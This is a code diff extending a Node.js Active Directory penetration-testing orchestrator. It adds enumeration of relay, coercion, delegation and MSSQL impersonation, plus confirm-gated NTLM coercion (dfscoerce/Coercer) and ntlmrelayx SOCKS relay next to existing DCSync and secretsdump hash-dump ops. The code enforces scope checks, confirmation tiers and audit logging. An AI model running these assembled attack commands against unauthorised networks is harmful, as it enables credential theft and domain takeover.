@@ -12,6 +12,12 @@
 //   node tools/ad.js bloodhound <domain> --dc <ip> --user u --pass-file f   collection→ingest (auto)
 //   node tools/ad.js dcsync <dc> --user u --pass-file f --confirm "reason"    domain hash dump (CONFIRM)
 //   node tools/ad.js secretsdump <host> --user u --pass-file f --confirm "reason"  local/SAM dump (CONFIRM)
+//   node tools/ad.js enum-relay <host|cidr> [--user u --pass-file f]        relayability audit (auto)
+//   node tools/ad.js enum-coerce <host> [--user u --pass-file f]            coercion-surface audit (auto)
+//   node tools/ad.js enum-delegation <dc> --domain d --user u               delegation enum (auto)
+//   node tools/ad.js enum-mssql <host> [--user u --pass-file f]             MSSQL impersonation audit (auto)
+//   node tools/ad.js coerce <host> --listener <h:p> --confirm "reason"      coercion toward listener (CONFIRM)
+//   node tools/ad.js relay <host|cidr> --listener <h:p> [--targets f] --confirm "reason"  ntlmrelayx SOCKS (CONFIRM)
 //
 // Rules of engagement (mirrors knowledge.md + c2-guard.js):
 //   - Every target host/CIDR is scope-checked BEFORE any binary spawns (fail-closed, audited).
@@ -29,8 +35,14 @@
 'use strict';
 const fs = require('fs');
 const path = require('path');
+const { spawnSync } = require('child_process');
 const sg = require('./scope-guard');
 const run = require('./run');
+
+// Binary presence probe for command-assembly fallbacks (which(1), come tool-plane.hasBin).
+function commandExists(bin) {
+  try { return spawnSync('/usr/bin/which', [bin], { stdio: 'ignore' }).status === 0; } catch { return false; }
+}
 
 const AUDIT_FILE = () =>
   process.env.RUN_AUDIT_FILE || path.join(__dirname, '..', 'reports', 'tmp', 'run-audit.jsonl');
@@ -63,6 +75,11 @@ const OP_TIER = {
   dcsync: 'confirm',    // pulls every domain hash — high impact
   secretsdump: 'confirm',
   relay: 'confirm',
+  'enum-relay': 'auto',      // relayability AUDIT (signing check): banners only, targets untouched
+  'enum-coerce': 'auto',     // coercion-surface fingerprint: netexec read-only modules, NO coercion sent
+  'enum-delegation': 'auto', // findDelegation enumeration (read-only)
+  'enum-mssql': 'auto',      // MSSQL logins/dbs + impersonation audit (read-only)
+  coerce: 'confirm',       // forces machine authentications toward a listener — high impact
 };
 
 function classify(op) {
@@ -164,6 +181,62 @@ function parseKerbHashes(text) {
   return hashes;
 }
 
+// netexec coercion-fingerprint modules (-M spooler-target/petitpotam/dfss) → per-host verdicts.
+// These modules ONLY probe whether the spooler/EFS/DFSNM endpoints answer — they never trigger an
+// authentication toward a listener, which is why the whole op stays auto-tier.
+// Line shape (best-effort): SMB  10.0.0.5  445  DC01  [+] spooler-target: vulnerable
+function parseCoerceModules(text) {
+  const out = [];
+  for (const line of String(text || '').split('\n')) {
+    const m = line.match(/SMB\s+(\S+)\s+\d+\s+\S+\s+(?:\[.\]\s*)?(spooler-target|petitpotam|dfss)\s*:?\s*(.*)/i);
+    if (!m) continue;
+    const [, host, mod, rest] = m;
+    const machine = mod.toLowerCase() === 'spooler-target' ? 'spoolsv' : mod.toLowerCase() === 'petitpotam' ? 'efs' : 'dfsnm';
+    const vulnerable = /\[\+\]/.test(line) && !/not\s+vulnerable/i.test(rest);
+    out.push({ host, machine, vulnerable, detail: rest.trim() || null });
+  }
+  return out;
+}
+
+// impacket-findDelegation best-effort parser. Output differs across impacket versions (per-account
+// blocks vs table rows), so we extract by keyword: an "Account" line opens a block, the next line
+// naming a delegation type closes it. Every hit is a LEAD — verify on the DC before reporting.
+function parseFindDelegation(text) {
+  const out = [];
+  let current = null;
+  for (const rawLine of String(text || '').split('\n')) {
+    const line = rawLine.trim();
+    if (!line) continue;
+    const am = line.match(/Account(?:\s+Name)?\s*[:=]\s*([^\s(]+)/i);
+    if (am) current = am[1];
+    const t = line.toLowerCase();
+    let type = null;
+    if (/unconstrained/.test(t)) type = 'unconstrained';
+    else if (/resource-based|\brbcd\b/.test(t)) type = 'rbcd';
+    else if (/constrained/.test(t)) type = 'constrained';
+    if (type && current) {
+      out.push({ account: current, type, protocol_transition: /protocol transition/.test(t) });
+      current = null; // one record per delegation line
+    }
+  }
+  return out;
+}
+
+// netexec mssql --users --db (+ mssql_priv module) → impersonation audit (read-only).
+// "can impersonate" rows are the P0.5 handoff: the CHAIN (chain.js) proposes the relay step,
+// the execution stays confirm-tier (P0.3). Best-effort on netexec text output.
+function parseMssqlAudit(text) {
+  const t = String(text || '');
+  const dbs = [...t.matchAll(/catalog:\s*(\S+)/gi)].map((m) => m[1]);
+  const impersonatable = [];
+  for (const line of t.split('\n')) {
+    const m = line.match(/User\s+'([^']+)'\s+can\s+impersonate:\s*'([^']+)'/i) ||
+              line.match(/\bIMPERSONATE\b[:\s]+(\S+)/i);
+    if (m) impersonatable.push({ user: m[1], as: m[2] || null });
+  }
+  return { dbs, impersonatable };
+}
+
 // enum4linux-ng / rpcclient password policy (best-effort).
 function parsePolicy(text) {
   const t = String(text || '');
@@ -210,6 +283,55 @@ function buildArgs(op, target, opts) {
       return { bin: 'impacket-secretsdump', args: [`${opts.domain || ''}/${opts.user || ''}@${target}`, '-just-dc'] };
     case 'secretsdump':
       return { bin: 'impacket-secretsdump', args: [`${opts.domain || ''}/${opts.user || ''}@${target}`] };
+    case 'enum-relay': {
+      // netexec --gen-relay-list = null/guest auth + per-host signing check. Output txt feeds
+      // the confirm-tier relay step; the structured map lands in reports/ad/relay-map-<ts>.json.
+      const a = ['smb', target];
+      if (opts.user) { a.push('-u', opts.user); a.push('-p', opts.passRef || ''); }
+      else a.push('-u', '', '-p', '');
+      a.push('--gen-relay-list', opts.relayListOut || path.join('reports', 'ad', 'relay-list.txt'));
+      return { bin: 'netexec', args: a };
+    }
+    case 'enum-coerce':
+      // Fingerprinting modules ONLY (spooler/efs/dfsnm presence): read-only, no coercion sent.
+      return { bin: 'netexec', args: ['smb', target,
+        ...(opts.user ? ['-u', opts.user, '-p', opts.passRef || ''] : ['-u', '', '-p', '']),
+        '-M', 'spooler-target', '-M', 'petitpotam', '-M', 'dfss'] };
+    case 'enum-delegation':
+      // impacket prompts for the password when needed (same pattern as dcsync above).
+      return { bin: 'impacket-findDelegation', args: [`${opts.domain || ''}/${opts.user || ''}@${target}`, '-dc-ip', target] };
+    case 'enum-mssql':
+      return { bin: 'netexec', args: ['mssql', target,
+        ...(opts.user ? ['-u', opts.user, '-p', opts.passRef || ''] : ['-u', '', '-p', '']),
+        '--users', '--db'] };
+    case 'coerce': {
+      // Coercion TOWARD opts.listener (host:port). `impacket-dfscoerce` NON esiste in upstream
+      // impacket (verificato su 0.13.1: nessuno script dfscoerce fra gli apps pipx): si usa solo
+      // se un build operator-supplied lo fornisce; altrimenti Coercer (pipx, @podalirius_) copre
+      // le stesse vettoriali MS-DFSNM/MS-EFSR. Coercer usa il solo IP del listener: la vittima
+      // richiama su porte servizio standard, quindi avviare ntlmrelayx di conseguenza.
+      if (!opts.listener) return null; // the runAd gate refuses with stage 'listener'
+      const has = typeof opts.which === 'function' ? opts.which : commandExists;
+      const lip = String(opts.listener).split(':')[0];
+      if (has('impacket-dfscoerce'))
+        return { bin: 'impacket-dfscoerce', args: ['-d', opts.domain || '', '-u', opts.user || '', opts.listener, target] };
+      if (has('coercer'))
+        return { bin: 'coercer', args: ['coerce', '-t', target, '-l', lip,
+          ...(opts.domain ? ['-d', opts.domain] : []),
+          ...(opts.user ? ['-u', opts.user, '-p', opts.passRef || ''] : ['--no-pass']),
+          '--always-continue'] };
+      return null; // nessun coercer installato: fail-closed, build refusata
+    }
+    case 'relay':
+      // ntlmrelayx SOCKS-only mode: passive auth collection. NO dump/write flags are ever
+      // assembled here — dcsync/secretsdump remain separate confirm-tier ops. The target
+      // list is the enum-relay output (--gen-relay-list txt). runAd additionally demands
+      // a registered listener session (stage 'listener').
+      if (!opts.listener) return null;
+      return { bin: 'impacket-ntlmrelayx', args: [
+        '-tf', opts.targets || path.join('reports', 'ad', 'relay-list.txt'),
+        '-smb2support', '-socks',
+        ...(opts.httpPort ? ['--http-port', String(opts.httpPort)] : [])] };
     default:
       return null;
   }
@@ -219,6 +341,20 @@ function buildArgs(op, target, opts) {
 // Orchestration. opts.runAd(bin,args,ctx) is injectable for offline tests; on real
 // runs it defaults to scope-check + tier-check + audit + run.runBinary.
 // ============================================================================
+// ---- sessions ledger (teardown): listeners + relay SOCKS sessions --------------------------
+const SESSIONS_JSON = () => process.env.SESSIONS_JSON || path.join(__dirname, '..', 'reports', 'sessions.json');
+function loadSessions() {
+  try { return JSON.parse(fs.readFileSync(SESSIONS_JSON(), 'utf8')); } catch { return { sessions: {} }; }
+}
+function findListenerSession(reg, listener) {
+  if (!listener || !reg || !reg.sessions) return null;
+  const norm = String(listener).toLowerCase().replace(/\/+$/, '');
+  return Object.entries(reg.sessions).find(([, s]) => {
+    if (!s || s.status === 'closed') return false;
+    return [s.host, s.endpoint, s.listener, s.target].some((v) => String(v || '').toLowerCase().includes(norm));
+  }) || null;
+}
+
 async function runAd(op, target, opts) {
   opts = opts || {};
   const scope = opts.scope || loadScope();
@@ -228,6 +364,20 @@ async function runAd(op, target, opts) {
 
   const tier = enforce(op, opts);
   if (!tier.ok) { audit({ op, target, verdict: 'tier-refused', tier: tier.tier }); return { ok: false, stage: 'tier', reason: tier.reason, tier: tier.tier }; }
+
+  // P0.3 anti-spray gate: coerce/relay need opts.listener AND a REGISTERED listener session
+  // in the sessions ledger. A confirm flag alone does not prove a listener is actually up.
+  if (op === 'coerce' || op === 'relay') {
+    if (!opts.listener) {
+      audit({ op, target, verdict: 'refused', reason: 'no --listener' });
+      return { ok: false, stage: 'listener', reason: `op '${op}' requires --listener <host:port> and a listener registered in the sessions ledger (anti-spray gate)` };
+    }
+    const entry = findListenerSession(loadSessions(), opts.listener);
+    if (!entry) {
+      audit({ op, target, verdict: 'refused', reason: `listener ${opts.listener} not registered` });
+      return { ok: false, stage: 'listener', reason: `listener ${opts.listener} is not registered in the sessions ledger (start it and register it first; see docs/host-exploitation.md "NTLM relay & coercion")` };
+    }
+  }
 
   const built = buildArgs(op, target, opts);
   if (!built) return { ok: false, stage: 'build', reason: `unknown op '${op}'` };
@@ -249,6 +399,10 @@ async function runAd(op, target, opts) {
   if (op === 'enum') { parsed.hosts = parseNxcSmbBanner(text); parsed.shares = parseNxcShares(text); parsed.policy = parsePolicy(text); }
   if (op === 'adcs') { Object.assign(parsed, parseCertipy(text)); }
   if (op === 'roast' || op === 'dcsync' || op === 'secretsdump') { parsed.hashes = parseKerbHashes(text); }
+  if (op === 'enum-relay') { parsed.hosts = parseNxcSmbBanner(text); parsed.relay_targets = parsed.hosts.filter((h) => h.signing === false); }
+  if (op === 'enum-coerce') { parsed.coerce_targets = parseCoerceModules(text); }
+  if (op === 'enum-delegation') { parsed.delegations = parseFindDelegation(text); }
+  if (op === 'enum-mssql') { Object.assign(parsed, parseMssqlAudit(text)); }
 
   // Persist transcript.
   try {
@@ -259,12 +413,37 @@ async function runAd(op, target, opts) {
     parsed._transcript = f;
   } catch { /* non-fatal */ }
 
+  // Structured relay map for the confirm-tier relay step (audit record; ntlmrelayx itself
+  // consumes the --gen-relay-list txt written by netexec).
+  if (op === 'enum-relay' && parsed.relay_targets) {
+    try {
+      const dir = OUT_DIR();
+      fs.mkdirSync(dir, { recursive: true });
+      const jf = path.join(dir, `relay-map-${Date.now()}.json`);
+      fs.writeFileSync(jf, JSON.stringify({ generated_at: new Date().toISOString(), target, relay_targets: parsed.relay_targets, hosts: parsed.hosts }, null, 2));
+      parsed._relay_map = jf;
+    } catch { /* non-fatal */ }
+  }
+
+  // Every SOCKS auth-collection session enters the teardown ledger so engagement close-out
+  // (tools/sessions.js) covers the relay sockets too. Best-effort: never blocks the result.
+  if (op === 'relay' && res && (res.status === 0 || res.status === undefined)) {
+    try {
+      require('./sessions').upsertSession({
+        id: `relay-${String(target).replace(/[^a-z0-9_.-]/gi, '_')}-${Date.now()}`,
+        type: 'ntlmrelayx-socks', status: 'open', host: opts.listener, target,
+        ts: new Date().toISOString(), note: 'SOCKS auth collection; teardown via tools/sessions.js on engagement close',
+      });
+    } catch { /* ledger best-effort */ }
+  }
+
   return { ok: (res && (res.status === 0 || res.status === undefined)) || !!parsed.hosts, op, target, tier: tier.tier, status: res && res.status, parsed };
 }
 
 module.exports = {
   classify, enforce, scopeCheck, buildArgs, runAd, loadScope,
   parseNxcSmbBanner, parseNxcShares, parseCertipy, parseKerbHashes, parsePolicy,
+  parseCoerceModules, parseFindDelegation, parseMssqlAudit, findListenerSession, loadSessions,
   OP_TIER,
 };
 
@@ -291,7 +470,10 @@ function parseCli(argv) {
 async function main() {
   const [op, target] = process.argv.slice(2);
   const opts = parseCli(process.argv.slice(4));
-  if (!op) { console.error('usage: node tools/ad.js <check|enum|roast|adcs|bloodhound|dcsync|secretsdump> <host> [opts]'); process.exit(2); }
+  if (!op) {
+    console.error('usage: node tools/ad.js <check|enum|roast|adcs|bloodhound|enum-relay|enum-coerce|enum-delegation|enum-mssql|dcsync|secretsdump|coerce|relay> <host> [opts]');
+    process.exit(2);
+  }
   if (op === 'check') {
     const sc = scopeCheck(target);
     console.log(sc.ok ? `IN SCOPE: ${target}` : `OUT OF SCOPE: ${target} (${sc.reason || 'not allowed'})`);
